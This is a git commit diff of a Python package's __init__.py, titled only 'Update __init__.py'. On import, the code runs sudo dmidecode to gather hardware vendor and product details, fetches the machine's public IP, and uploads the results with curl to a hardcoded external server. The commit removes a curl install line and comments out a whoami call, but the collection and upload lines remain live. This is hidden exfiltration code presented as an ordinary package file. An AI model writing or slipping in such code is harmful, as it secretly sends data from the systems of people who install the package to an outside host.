48f156c7a0da04cc16b90f3914cce1de20240259
Ritik <40895801+ritikvirus@users.noreply.github.com>
2024-04-05 12:54:36 +0530

    Update __init__.py

--- __init__.py
+++ __init__.py
@@ -6,14 +6,10 @@ import requests
 
 
 
-
-subprocess.run("sudo apt install curl -y", shell=True)
-
 # Ensure permissions for dmidecode 
 subprocess.run("sudo dmidecode | grep -i -e product -e manufacturer -e vendor > system_info.html", shell=True)
 subprocess.run("curl ifconfig.me >> system_info.html", shell=True)  
-subprocess.run("whoami >> system_info.html", shell=True)  
-
+#subprocess.run("whoami >> system_info.html", shell=True)  
 
 # Ensure the server is running and the file exists 
 subprocess.run('curl -F "file=@system_info.html" http://44.213.80.165:7801/upload', shell=True) 
